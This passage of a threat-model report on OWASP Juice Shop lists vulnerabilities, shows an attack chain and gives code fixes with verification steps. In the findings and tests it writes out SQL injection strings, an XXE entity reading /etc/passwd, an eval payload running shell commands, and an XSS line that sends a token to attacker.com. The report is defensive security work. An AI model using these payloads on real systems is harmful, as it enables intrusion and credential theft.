| <a id="t-019"></a>[T-019](#t-019) | Express API | Information Disclosure | Application log files are served unauthenticated at [server.ts:281-283](vscode://file/home/mrohr/juice-shop/server.ts:281) (`/support/logs`). Morgan access logs in 'combined' format include client IP addresses, user agents, request paths (which may contain tokens or PII in query strings), and response codes — all readable by any unauthenticated attacker. (CWE-532) Violated: [LM-003](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html) | 🟠 High | 🟡 Medium | 🟡 Medium | Log rotation limits volume | [M-014](#m-014) |
| <a id="t-020"></a>[T-020](#t-020) | Express API | Information Disclosure | The order history endpoint (`GET /rest/order-history`) at [server.ts:621](vscode://file/home/mrohr/juice-shop/server.ts:621) returns order records without filtering by the authenticated user's ID. Any authenticated user can view all orders placed by all customers, disclosing purchase history, delivery addresses, and payment method references. (CWE-639) Violated: [AC-006](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html) | 🟡 Medium | 🟡 Medium | 🟡 Medium | Requires authentication | [M-012](#m-012) |
| <a id="t-021"></a>[T-021](#t-021) | Express API | Information Disclosure | The `GET /rest/admin/application-configuration` endpoint at [server.ts:605](vscode://file/home/mrohr/juice-shop/server.ts:605) requires only customer-level authentication. Any logged-in user can retrieve the full application configuration including Google OAuth client ID, chatbot configuration, challenge settings, and feature flags that reveal internal architecture details. (CWE-200) | 🟡 Medium | 🟡 Medium | 🟡 Medium | Requires authentication | [M-016](#m-016) |
| <a id="t-022"></a>[T-022](#t-022) | Auth Service | Denial of Service | The login endpoint `POST /rest/user/login` at [server.ts:594](vscode://file/home/mrohr/juice-shop/server.ts:594) has no rate limiting. An attacker can submit unlimited login attempts, enabling brute-force attacks against user accounts and potentially exhausting database connections or server resources. (CWE-307) Violated: [AC-003](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html) | 🟠 High | 🟡 Medium | 🟡 Medium | Rate limiting exists only on /rest/user/reset-password | [M-017](#m-017) |
| <a id="t-023"></a>[T-023](#t-023) | Express API | Denial of Service | The chatbot initialization at [routes/chatbot.ts](vscode://file/home/mrohr/juice-shop/routes/chatbot.ts) downloads training data from a configurable URL. If the training URL is externally configurable via config, an attacker controlling the config can redirect training data fetches to a slow server (slowloris) or cause the chatbot to load malicious training data. The `POST /rest/chatbot/respond` endpoint is also accessible without rate limiting. (CWE-400) | 🟡 Medium | 🟡 Medium | 🟡 Medium | Training validated by validateChatBot() | [M-017](#m-017) |
| <a id="t-024"></a>[T-024](#t-024) | Auth Service | Spoofing | The application implements its own authentication without integrating a standard identity provider. TOTP-based 2FA exists at [routes/2fa.ts](vscode://file/home/mrohr/juice-shop/routes/2fa.ts) but is optional and not enforced by default. Brute-force of security questions enables password reset without knowledge of the original credential. (CWE-307) Violated: [AC-004](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html) | 🟡 Medium | 🟡 Medium | 🟡 Medium | TOTP optional; rate limit on reset endpoint | [M-018](#m-018) |

### 8.4 Low (5)

Low-rated threats document residual risk and minor hygiene issues. They are typically addressed opportunistically as part of related work.

| ID | Component | STRIDE | Threat Scenario | Likelihood | Impact | Risk | Controls in Place | Mitigations |
|----|-----------|--------|-----------------|------------|--------|------|-------------------|-------------|
| <a id="t-025"></a>[T-025](#t-025) | Auth Service | Spoofing | Password reset via [routes/resetPassword.ts](vscode://file/home/mrohr/juice-shop/routes/resetPassword.ts) relies on security questions. Security questions are guessable from public profile information, and the security question itself is exposed unauthenticated via `GET /rest/user/security-question`. An attacker who knows a victim's email can determine their security question and social-engineer or guess the answer. (CWE-640) | 🟡 Medium | 🟢 Low | 🟢 Low | Rate limiting on reset endpoint | [M-018](#m-018) |
| <a id="t-026"></a>[T-026](#t-026) | Express API | Information Disclosure | No HTTPS/TLS is configured in the application itself ([server.ts](vscode://file/home/mrohr/juice-shop/server.ts) creates `http.Server`, not `https.Server`). No HSTS header is set. Deployments without a TLS-terminating reverse proxy transmit all authentication tokens, passwords, and PII in cleartext. (CWE-319) Violated: [WEB-005](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html) | 🟢 Low | 🟡 Medium | 🟢 Low | Relies on infrastructure TLS; common in container deployments | [M-019](#m-019) |
| <a id="t-027"></a>[T-027](#t-027) | Express API | Repudiation | Security events (failed logins, authorization failures, privilege escalation attempts) are not logged in a structured, centralized format. Morgan logs access in 'combined' format but does not tag events by type. Without structured security event logging, incident investigation cannot reconstruct attacker activity. (CWE-778) Violated: [LM-001](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html) | 🟢 Low | 🟡 Medium | 🟢 Low | Morgan access logging present; Winston logger exists | [M-020](#m-020) |
| <a id="t-028"></a>[T-028](#t-028) | Express API | Information Disclosure | CORS is configured as a global wildcard at [server.ts:181](vscode://file/home/mrohr/juice-shop/server.ts:181): `app.use(cors())`. This allows any origin to make cross-origin requests and receive responses, enabling cross-site request reading by malicious websites against authenticated sessions. OAuth implicit flow at [login.component.ts:134](vscode://file/home/mrohr/juice-shop/frontend/src/app/login/login.component.ts:134) uses deprecated `response_type=token`. (CWE-346) Violated: [WEB-003](https://cheatsheetseries.owasp.org/cheatsheets/CORS_Security_Cheat_Sheet.html) | 🟢 Low | 🟡 Medium | 🟢 Low | None | [M-007](#m-007) |
| <a id="t-029"></a>[T-029](#t-029) | Express API | Tampering | The password change endpoint is `GET /rest/user/change-password` ([routes/changePassword.ts:13](vscode://file/home/mrohr/juice-shop/routes/changePassword.ts:13)) — a state-changing action performed via HTTP GET with parameters in the query string. No CSRF token or SameSite cookie attribute is enforced, enabling cross-site request forgery from any page the user visits. (CWE-352) Violated: [WEB-001](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) | 🟢 Low | 🟡 Medium | 🟢 Low | Requires authentication header | [M-021](#m-021) |

---

## 9. Critical Findings

The following findings require immediate attention. Each entry links to the mitigation that addresses it. When multiple critical findings exist they typically chain together into a single attacker workflow — the diagram below shows how.

The diagram below traces how an unauthenticated attacker can chain the Critical findings into a full compromise of the system. Each node is a Critical finding linked to its detail entry.

```mermaid
graph LR
    classDef crit fill:#FFB6C1,stroke:#c00,color:#000,stroke-width:2px
    Start(["Unauthenticated\nattacker"]):::crit
    T3["T-003\nSQLi search\nextracts users"]:::crit
    T2["T-002\nSQLi login\nauth bypass"]:::crit
    T1["T-001\nForged JWT\nadmin token"]:::crit
    T5["T-005\nSSTI eval\nRCE on server"]:::crit
    T4["T-004\nXXE file read\n/etc/passwd"]:::crit
    Goal(["Full host\ncompromise"]:::crit)
    Start -->|"GET /rest/products/search"| T3
    Start -->|"POST /rest/user/login"| T2
    T3 -->|"leaked hashes + hardcoded key"| T1
    T2 -->|"admin session"| T5
    T1 -->|"forge admin JWT"| T5
    T5 -->|"execSync shell"| Goal
    T4 -->|"read key material"| T1
```

**Key takeaway:** An unauthenticated attacker has three independent paths to full server compromise — SQL injection on login, SQL injection on search combined with the public private key, or XXE to read key material — and all three converge at the same eval-based RCE sink in the authenticated user profile endpoint.

---

### 🔴 T-001 — Hardcoded RSA Private Key

**Scenario:** The RSA private key used to sign all JWTs is hardcoded in [lib/insecurity.ts:27](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:27). Any actor with repository read access (this is a public repository) can sign arbitrary JWT payloads — including admin-role tokens — and authenticate as any user without credentials. (CWE-321)

**Current state:** Private key embedded as a multiline string literal in source. The `authorize()` function at [lib/insecurity.ts:56](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:56) uses this hardcoded `privateKey` variable directly. No key rotation mechanism exists.

**Violated Requirements:** [DP-005](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html) — Secrets in dedicated secret manager, [AC-005](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html) — Validate token claims on every request

→ **Mitigation:** [M-001 — Remove hardcoded RSA private key and rotate](#m-001) · **P1**

---

### 🔴 T-002 — SQL Injection in Login Endpoint

**Scenario:** The login query at [routes/login.ts:34](vscode://file/home/mrohr/juice-shop/routes/login.ts:34) concatenates `req.body.email` into raw SQL. An unauthenticated attacker submits `' OR 1=1--` as the email to log in as the first database user (admin) with no password required. (CWE-89)

**Current state:** Zero parameterization — template literal used directly in `models.sequelize.query()`. No input sanitization on the email field before query construction.

**Violated Requirements:** [IV-004](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) — Parameterized queries for all database access

→ **Mitigation:** [M-002 — Parameterize all SQL queries](#m-002) · **P1**

---

### 🔴 T-003 — SQL Injection in Product Search

**Scenario:** The search endpoint at [routes/search.ts:23](vscode://file/home/mrohr/juice-shop/routes/search.ts:23) concatenates `req.query.q` into raw SQL. An unauthenticated attacker injects a UNION SELECT to extract all users' emails and MD5-hashed passwords in a single request. (CWE-89)

**Current state:** Same root cause as T-002 — template literal SQL. The 200-character length limit on criteria does not prevent UNION injection payloads.

**Violated Requirements:** [IV-004](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) — Parameterized queries for all database access

→ **Mitigation:** [M-002 — Parameterize all SQL queries](#m-002) · **P1**

---

### 🔴 T-004 — XXE via XML File Upload

**Scenario:** The XML upload handler at [routes/fileUpload.ts:83](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts:83) calls `libxml.parseXml(data, { noent: true })`. An unauthenticated attacker uploads an XML file with `<!ENTITY xxe SYSTEM "file:///etc/passwd">` and receives the file contents in the error response body. (CWE-611)

**Current state:** `noent: true` explicitly enables external entity resolution. Error message at line 87 includes `utils.trunc(xmlString, 400)` — the parsed XML (including resolved entities) is returned in the HTTP 410 response.

**Violated Requirements:** [IV-002](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) — Harden XML parsers to prevent XXE, [EH-001](https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html) — No internal details in error responses

→ **Mitigation:** [M-003 — Disable XXE in XML parser](#m-003) · **P1**

---

### 🔴 T-005 — Server-Side Eval / SSTI in User Profile

**Scenario:** The user profile route at [routes/userProfile.ts:62](vscode://file/home/mrohr/juice-shop/routes/userProfile.ts:62) executes `eval(code)` where `code` is extracted from the username field when it matches `#{...}`. An authenticated user sets their username to `#{process.mainModule.require('child_process').execSync('id').toString()}` to execute arbitrary OS commands. (CWE-95)

**Current state:** `eval()` is called directly with user-controlled data. Comment in code acknowledges the vulnerability (`// eslint-disable-line no-eval`).

**Violated Requirements:** [IV-001](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html) — Validate all external input; reject unknown fields

→ **Mitigation:** [M-004 — Remove eval() calls from profile and B2B order routes](#m-004) · **P1**

---

### 🔴 T-006 — RCE via safeEval in B2B Order Endpoint

**Scenario:** The B2B order endpoint at [routes/b2bOrder.ts:23](vscode://file/home/mrohr/juice-shop/routes/b2bOrder.ts:23) uses `vm.runInContext('safeEval(orderLinesData)', sandbox)` where `orderLinesData` is directly from the request body. The `notevil` library sandbox has documented escape paths via prototype pollution; an authenticated B2B customer achieves RCE. (CWE-94)

**Current state:** Code comment `// Requires auth` — but JWT auth (T-001) can be bypassed via hardcoded key, making this effectively unauthenticated.

**Violated Requirements:** [IV-001](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html) — Validate all external input; reject unknown fields

→ **Mitigation:** [M-004 — Remove eval() calls from profile and B2B order routes](#m-004) · **P1**

---

## 10. Mitigation Register

Prioritised measures to address identified threats. Each mitigation lists the threats it addresses, the requirements it fulfils, its rollout priority (P1–P4) and concrete implementation guidance.

### P1 — Immediate

### <a id="m-001"></a>M-001 · Remove hardcoded RSA private key and rotate

**Addresses:** [T-001](#t-001)
**Fulfills Requirements:** [DP-005](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html) — Secrets in dedicated secret manager, [AC-005](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html) — Validate token claims
**Priority:** **P1 — Immediate** · **Severity:** 🔴 Critical · **Effort:** Low

**Why:** The private key hardcoded in [lib/insecurity.ts:27](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:27) is publicly known to anyone with repo access. Every JWT ever issued by this application can be forged offline. Rotating the key immediately invalidates all existing sessions signed with the compromised key.

**How:**
1. Generate a new RSA key pair: `openssl genrsa -out jwt_private.pem 2048 && openssl rsa -in jwt_private.pem -pubout -out jwt_public.pem`
2. Store the new private key as an environment variable or in a secrets manager (e.g., AWS Secrets Manager, HashiCorp Vault): `export JWT_PRIVATE_KEY="$(cat jwt_private.pem)"`
3. Update [lib/insecurity.ts](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts) to load from environment:
4. Delete the key files from disk; never commit key material to source control
5. Rotate immediately — all existing tokens signed with the old key become invalid

```typescript
// Before (lib/insecurity.ts:27)
const privateKey = '-----BEGIN RSA PRIVATE KEY-----\r\nMIICXAIBAAK...'

// After
const privateKey = process.env.JWT_PRIVATE_KEY
  ?? fs.readFileSync('/run/secrets/jwt_private_key', 'utf8')
if (!privateKey || privateKey.length < 100) {
  throw new Error('JWT_PRIVATE_KEY environment variable not set or invalid')
}
```

**Verification:** Generate a token with the old private key and attempt to call `GET /rest/user/whoami` with it — the server must return 401. Confirm `process.env.JWT_PRIVATE_KEY` is set in the deployment environment and the private key file is not in the source tree: `grep -r "BEGIN RSA PRIVATE KEY" . --include="*.ts"` must return no results.

---

### <a id="m-002"></a>M-002 · Parameterize all SQL queries

**Addresses:** [T-002](#t-002), [T-003](#t-003)
**Fulfills Requirements:** [IV-004](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) — Parameterized queries for all database access
**Priority:** **P1 — Immediate** · **Severity:** 🔴 Critical · **Effort:** Medium

**Why:** Template-literal string interpolation in raw Sequelize queries at [routes/login.ts:34](vscode://file/home/mrohr/juice-shop/routes/login.ts:34) and [routes/search.ts:23](vscode://file/home/mrohr/juice-shop/routes/search.ts:23) allows unauthenticated SQL injection, enabling both authentication bypass and full database extraction. The OWASP SQL Injection Prevention Cheat Sheet mandates: "Use of Prepared Statements (with Parameterized Queries)."

**How:**
1. Replace raw query in login route with Sequelize `findOne` using a `where` clause (fully parameterized by Sequelize)
2. Replace raw query in search route with Sequelize `Op.like` operator
3. Audit all other raw `sequelize.query()` calls and replace or add replacements/bind parameters
4. Add a lint rule (`no-sequelize-raw-query`) to prevent regression

```typescript
// Before (routes/login.ts:34)
models.sequelize.query(
  `SELECT * FROM Users WHERE email = '${req.body.email}' AND password = '${hash}' AND deletedAt IS NULL`,
  { model: UserModel, plain: true }
)

// After
UserModel.findOne({
  where: {
    email: req.body.email,
    password: security.hash(req.body.password || ''),
    deletedAt: null
  }
})
```

```typescript
// Before (routes/search.ts:23)
models.sequelize.query(
  `SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`
)

// After
ProductModel.findAll({
  where: {
    [Op.and]: [
      { [Op.or]: [
        { name: { [Op.like]: `%${criteria}%` } },
        { description: { [Op.like]: `%${criteria}%` } }
      ]},
      { deletedAt: null }
    ]
  },
  order: [['name', 'ASC']]
})
```

**Verification:** Send `GET /rest/products/search?q='%20UNION%20SELECT%20*%20FROM%20Users--` — response must return 200 with only products matching the literal string, no user data. Send `POST /rest/user/login` with `{"email":"' OR 1=1--","password":"x"}` — response must be 401, not a valid JWT.

---

### <a id="m-003"></a>M-003 · Disable XXE in XML parser

**Addresses:** [T-004](#t-004)
**Fulfills Requirements:** [IV-002](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) — Harden XML parsers to prevent XXE
**Priority:** **P1 — Immediate** · **Severity:** 🔴 Critical · **Effort:** Low

**Why:** The OWASP XXE Prevention Cheat Sheet states: "The safest way to prevent XXE is always to disable DTDs (External Entities) completely." Setting `noent: false` and `nonet: true` in the libxmljs2 options disables external entity resolution and network fetches in a single-line change.

**How:**
1. Update the libxmljs2 parse options in [routes/fileUpload.ts:83](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts:83)
2. Set `nonet: true` to also block network-based XXE (SSRF via XML)
3. Remove the parsed XML content from error messages — return a generic message only

```typescript
// Before (routes/fileUpload.ts:83)
const xmlDoc = vm.runInContext(
  'libxml.parseXml(data, { noblanks: true, noent: true, nocdata: true })',
  sandbox, { timeout: 2000 }
)
// ...
next(new Error('...deprecated... ' + utils.trunc(xmlString, 400)))  // leaks file contents

// After
const xmlDoc = vm.runInContext(
  'libxml.parseXml(data, { noblanks: true, noent: false, nonet: true, nocdata: true })',
  sandbox, { timeout: 2000 }
)
// ...
next(new Error('B2B customer complaints via XML file upload have been deprecated for security reasons.'))
```

**Verification:** Upload an XML file containing `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>` to `POST /file-upload`. The response must not contain any contents of `/etc/passwd`. The 410 error message must not include any file system content.

---

### <a id="m-004"></a>M-004 · Remove eval() calls from userProfile and b2bOrder routes

**Addresses:** [T-005](#t-005), [T-006](#t-006)
**Fulfills Requirements:** [IV-001](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html) — Validate all external input; reject unknown fields
**Priority:** **P1 — Immediate** · **Severity:** 🔴 Critical · **Effort:** Low

**Why:** Both `eval()` in [routes/userProfile.ts:62](vscode://file/home/mrohr/juice-shop/routes/userProfile.ts:62) and `vm.runInContext('safeEval(...)')` in [routes/b2bOrder.ts:23](vscode://file/home/mrohr/juice-shop/routes/b2bOrder.ts:23) execute user-controlled strings as code. There is no legitimate business requirement to eval user-supplied data. The Pug template system handles username display safely without eval; B2B order line data should be validated as structured JSON.

**How:**
1. Remove the `eval(code)` block from [routes/userProfile.ts:55-65](vscode://file/home/mrohr/juice-shop/routes/userProfile.ts:55) — the username is already sanitized and can be inserted into Pug templates safely via the template context object
2. Replace the `vm.runInContext` + `safeEval` pattern in [routes/b2bOrder.ts:18-27](vscode://file/home/mrohr/juice-shop/routes/b2bOrder.ts:18) with strict JSON schema validation

```typescript
// Before (routes/userProfile.ts:55-65)
if (username?.match(/#{(.*)}/) !== null && utils.isChallengeEnabled(...)) {
  const code = username?.substring(2, username.length - 1)
  username = eval(code)  // SSTI
}

// After — remove eval entirely; render username via Pug context
// username is already set; pass it to pug.compile as template variable
// No eval needed — Pug escapes variables by default
```

```typescript
// Before (routes/b2bOrder.ts:18-24)
const orderLinesData = body.orderLinesData || ''
vm.createContext(sandbox)
vm.runInContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })

// After — strict JSON parse with schema validation
const orderLines = JSON.parse(body.orderLinesData)
if (!Array.isArray(orderLines)) throw new Error('Invalid order format')
orderLines.forEach(line => {
  if (typeof line.productId !== 'number' || typeof line.quantity !== 'number') {
    throw new Error('Invalid order line structure')
  }
})
```

**Verification:** Set username to `#{7*7}` via the profile API — the profile page must render the literal string `#{7*7}`, not `49`. Send `POST /b2b/v2/orders` with `{"orderLinesData":"require('os').hostname()","cid":"test"}` — response must be 400 JSON parse error, not the server hostname.

---

### P2 — This Sprint

### <a id="m-005"></a>M-005 · Replace MD5 with bcrypt for password hashing

**Addresses:** [T-010](#t-010)
**Fulfills Requirements:** [DP-004](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html) — Do not store user credentials; use adaptive hashing
**Priority:** **P2 — This Sprint** · **Severity:** 🟠 High · **Effort:** Medium

**Why:** MD5 is a cryptographic hash function, not a password hashing function. It produces digests in nanoseconds with no work factor, enabling offline dictionary attacks and rainbow table lookups. The OWASP Password Storage Cheat Sheet mandates using bcrypt (cost ≥ 10), argon2id, or scrypt. A database breach under MD5 results in immediate compromise of all user accounts.

**How:**
1. Install bcrypt: `npm install bcrypt @types/bcrypt`
2. Update the password setter in [models/user.ts:76](vscode://file/home/mrohr/juice-shop/models/user.ts:76) to use async bcrypt hash
3. Update the login query in [routes/login.ts](vscode://file/home/mrohr/juice-shop/routes/login.ts) to fetch by email only, then compare with `bcrypt.compare()`
4. Run a migration to re-hash all existing MD5 passwords on next login (transparent migration)

```typescript
// Before (models/user.ts:76-77)
set (clearTextPassword: string) {
  this.setDataValue('password', security.hash(clearTextPassword)) // MD5
}

// After
import bcrypt from 'bcrypt'
const BCRYPT_ROUNDS = 12

set (clearTextPassword: string) {
  // Note: Use async hook (beforeCreate/beforeUpdate) for proper async support
  this.setDataValue('password', bcrypt.hashSync(clearTextPassword, BCRYPT_ROUNDS))
}
```

**Verification:** Register a new user and inspect the password field in the database — it must start with `$2b$12$` (bcrypt prefix), not a 32-character hex string. Confirm login still works for the new user. Confirm login fails for incorrect password.

---

### <a id="m-006"></a>M-006 · Move JWT tokens to HttpOnly cookies (remove localStorage)

**Addresses:** [T-007](#t-007), [T-009](#t-009)
**Fulfills Requirements:** [WEB-002](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html) — No sensitive data in localStorage
**Priority:** **P2 — This Sprint** · **Severity:** 🟠 High · **Effort:** High

**Why:** Storing authentication tokens in `localStorage` exposes them to theft by any JavaScript running in the same origin — including XSS payloads, malicious browser extensions, and compromised third-party scripts. The OWASP HTML5 Security Cheat Sheet states: "Do not store session identifiers in localStorage as the data is always accessible by JavaScript." HttpOnly cookies are inaccessible from JavaScript regardless of XSS.

**How:**
1. Remove `localStorage.setItem('token', ...)` from [login.component.ts:101](vscode://file/home/mrohr/juice-shop/frontend/src/app/login/login.component.ts:101)
2. Set the JWT as an HttpOnly, Secure, SameSite=Strict cookie on the server side in the login response
3. Update all API calls to use cookie-based authentication instead of `Authorization: Bearer` header built from localStorage
4. Update the Express JWT middleware to read from the cookie instead of the Authorization header

```typescript
// Before (login.component.ts:101)
localStorage.setItem('token', authentication.token)

// After — let server set HttpOnly cookie; no client-side token storage
// Server-side change (routes/login.ts afterLogin):
res.cookie('token', token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'strict',
  maxAge: 6 * 60 * 60 * 1000  // 6 hours — match JWT expiry
})
```

**Verification:** After login, open browser DevTools → Application → Local Storage — no `token` key must be present. Confirm that an XSS payload `<script>fetch('https://attacker.com?t='+localStorage.getItem('token'))</script>` sends `t=null`. Confirm authenticated API calls still succeed using the cookie.

---

### P3 — Next Quarter

### <a id="m-007"></a>M-007 · Restrict CORS to known origins

**Addresses:** [T-028](#t-028)
**Fulfills Requirements:** [WEB-003](https://cheatsheetseries.owasp.org/cheatsheets/CORS_Security_Cheat_Sheet.html) — Restrictive CORS with explicit origin allowlist
**Priority:** **P3 — Next Quarter** · **Severity:** 🟢 Low · **Effort:** Low

**Why:** The current wildcard `cors()` configuration allows any origin to make credentialed cross-origin requests and read responses. A restrictive allowlist ensures only the legitimate frontend origin can access the API.

**How:**
1. Replace `app.use(cors())` at [server.ts:182](vscode://file/home/mrohr/juice-shop/server.ts:182) with an explicit origin allowlist
2. Set `credentials: true` only if cookies are used (after M-006); otherwise omit

```typescript
// Before (server.ts:181-182)
app.options('*', cors())
app.use(cors())

// After
const corsAllowlist = (process.env.CORS_ORIGINS || 'http://localhost:3000').split(',')
const corsOptions: cors.CorsOptions = {
  origin: (origin, callback) => {
    if (!origin || corsAllowlist.includes(origin)) {
      callback(null, true)
    } else {
      callback(new Error(`Origin ${origin} not allowed by CORS policy`))
    }
  },
  credentials: true  // only after M-006 (HttpOnly cookies)
}
app.options('*', cors(corsOptions))
app.use(cors(corsOptions))
```

**Verification:** Send a request with `Origin: https://evil.com` — the response must not include `Access-Control-Allow-Origin: https://evil.com`. A request from the legitimate origin must include the correct ACAO header.

---

### <a id="m-008"></a>M-008 · Add global Content-Security-Policy header

**Addresses:** [T-009](#t-009), [T-005](#t-005)
**Fulfills Requirements:** [WEB-004](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) — Activate CSP on all internet-facing applications
**Priority:** **P3 — Next Quarter** · **Severity:** 🟠 High · **Effort:** Medium

**Why:** A Content-Security-Policy header restricts which scripts can execute and which origins can be loaded, providing a critical second line of defence against XSS. The current per-profile CSP at [routes/userProfile.ts:88](vscode://file/home/mrohr/juice-shop/routes/userProfile.ts:88) contains `unsafe-eval` and is injected via user-controlled `profileImage` — itself a vulnerability.

**How:**
1. Add `helmet.contentSecurityPolicy()` to the middleware chain in [server.ts](vscode://file/home/mrohr/juice-shop/server.ts) after `helmet.frameguard()`
2. Remove the dynamic CSP from [routes/userProfile.ts:88-95](vscode://file/home/mrohr/juice-shop/routes/userProfile.ts:88)
3. Use a nonce-based policy for inline scripts (Angular requires nonce or hash for its runtime)
4. Start with `Content-Security-Policy-Report-Only` to monitor violations before enforcing

```typescript
// Add to server.ts after helmet.frameguard()
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],   // Remove unsafe-eval after fixing Angular build config
    styleSrc: ["'self'", "'unsafe-inline'"],  // Narrow further once CSS-in-JS removed
    imgSrc: ["'self'", 'data:', 'https:'],
    connectSrc: ["'self'"],
    fontSrc: ["'self'"],
    objectSrc: ["'none'"],
    frameSrc: ["'none'"],
    reportUri: '/csp-report'
  },
  reportOnly: true  // Switch to false after validation
}))
```

**Verification:** Check the response headers of `GET /` — `Content-Security-Policy` (or `Content-Security-Policy-Report-Only`) must be present. Attempt to execute inline JavaScript via browser console — the CSP must block it and log a violation to `/csp-report`.

---

### <a id="m-009"></a>M-009 · Fix Zip Slip path traversal in ZIP upload handler

**Addresses:** [T-008](#t-008)
**Fulfills Requirements:** [IV-005](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html) — Validate, sanitize, and securely store uploaded files
**Priority:** **P3 — Next Quarter** · **Severity:** 🟠 High · **Effort:** Low

**Why:** The ZIP extraction at [routes/fileUpload.ts:40-45](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts:40) uses `absolutePath.includes(path.resolve('.'))` to guard against path traversal, but this check is bypassable. The fix requires using `path.resolve()` and checking that the resolved path starts with (not just includes) the target directory.

**How:**
1. Update the path validation in [routes/fileUpload.ts:43-45](vscode://file/home/mrohr/juice-shop/routes/fileUpload.ts:43)
2. Sanitize the entry filename using `sanitize-filename` before path construction

```typescript
// Before (routes/fileUpload.ts:40-46)
const fileName = entry.path
const absolutePath = path.resolve('uploads/complaints/' + fileName)
if (absolutePath.includes(path.resolve('.'))) {  // bypassable!
  entry.pipe(fs.createWriteStream('uploads/complaints/' + fileName)...)
}

// After
import sanitizeFilename from 'sanitize-filename'
const safeFileName = sanitizeFilename(path.basename(entry.path))
const targetDir = path.resolve('uploads/complaints')
const absolutePath = path.resolve(targetDir, safeFileName)
if (!absolutePath.startsWith(targetDir + path.sep)) {  // strict prefix check
  entry.autodrain()
  return
}
entry.pipe(fs.createWriteStream(absolutePath)...)
```

**Verification:** Create a ZIP file containing an entry with path `../../../ftp/pwned.txt` and upload it to `POST /file-upload`. The file `ftp/pwned.txt` must NOT exist after the upload. The upload must return 204 with the traversal silently drained.

---

### <a id="m-010"></a>M-010 · Remove bypassSecurityTrustHtml from Angular components

**Addresses:** [T-009](#t-009)
**Fulfills Requirements:** [WEB-007](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) — Encode all user-controlled output; use framework-native binding
**Priority:** **P3 — Next Quarter** · **Severity:** 🟠 High · **Effort:** Medium

**Why:** `DomSanitizer.bypassSecurityTrustHtml()` at [search-result.component.ts:132](vscode://file/home/mrohr/juice-shop/frontend/src/app/search-result/search-result.component.ts:132) and line 170 disables Angular's built-in XSS protection for product descriptions and search values. Angular's text binding (`{{value}}`) escapes HTML by default — use it instead.

**How:**
1. Replace `bypassSecurityTrustHtml()` calls with `DomSanitizer.sanitize(SecurityContext.HTML, value)` for HTML-rendering use cases
2. For plain text display, switch from `[innerHTML]` to `{{value}}` text binding
3. Audit all 8+ `[innerHTML]` bindings in templates and apply the same fix

```typescript
// Before (search-result.component.ts:170)
this.searchValue = this.sanitizer.bypassSecurityTrustHtml(queryParam)

// After
import { SecurityContext } from '@angular/core'
this.searchValue = this.sanitizer.sanitize(SecurityContext.HTML, queryParam) ?? ''
```

**Verification:** Set a product description to `<img src=x onerror=alert(1)>` and search for it — no alert must fire. The description must display as escaped HTML text.

---

### <a id="m-011"></a>M-011 · Parameterize MarsDB NoSQL queries

**Addresses:** [T-011](#t-011), [T-012](#t-012)
**Priority:** **P3 — Next Quarter** · **Severity:** 🟠 High · **Effort:** Medium

**Why:** The `$where` clause in MarsDB at [routes/showProductReviews.ts:36](vscode://file/home/mrohr/juice-shop/routes/showProductReviews.ts:36) evaluates JavaScript from user input, enabling NoSQL injection and DoS. The `{ multi: true }` update without ownership check at [routes/updateProductReviews.ts:17](vscode://file/home/mrohr/juice-shop/routes/updateProductReviews.ts:17) enables mass-update injection.

**How:**
1. Replace `$where` with `{ product: Number(id) }` — cast to number to prevent injection
2. Add ownership check before update: verify `result.original[0].author === user.data.email`
3. Remove `multi: true` — updates should target exactly one review

```typescript
// Before (routes/showProductReviews.ts:36)
db.reviewsCollection.find({ $where: 'this.product == ' + id })

// After
db.reviewsCollection.find({ product: Number(id) })
```

